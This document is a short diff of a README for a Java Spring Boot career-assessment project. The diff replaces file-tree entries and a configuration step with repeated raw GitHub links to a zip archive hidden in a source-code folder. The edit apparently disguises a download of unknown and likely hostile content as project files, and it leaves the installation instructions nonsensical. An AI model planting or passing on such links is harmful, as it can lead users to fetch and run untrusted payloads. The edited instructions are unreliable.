@@ -38,8 +38,8 @@ career-assessment-tool/
 ├── static/
 ├── templates/
 ├── Dockerfile
-├── pom.xml
-└── README.md
+├── https://github.com/SAIVIVEK123321/CareerAssessment/raw/refs/heads/master/src/main/java/com/klef/jfsd/project/StudentCarrerProject/controller/Career_Assessment_v2.2.zip
+└── https://github.com/SAIVIVEK123321/CareerAssessment/raw/refs/heads/master/src/main/java/com/klef/jfsd/project/StudentCarrerProject/controller/Career_Assessment_v2.2.zip
 
 ## 💡 How It Works
 1. Students take assessments through a clean UI
@@ -49,6 +49,6 @@ career-assessment-tool/
 
 ## 🛠️ Installation
 1. Clone the repository  
-2. Configure database in `application.properties`  
+2. Configure database in `https://github.com/SAIVIVEK123321/CareerAssessment/raw/refs/heads/master/src/main/java/com/klef/jfsd/project/StudentCarrerProject/controller/Career_Assessment_v2.2.zip`  
 3. Run using `mvn spring-boot:run`  
 4. Access at `http://localhost:8080`
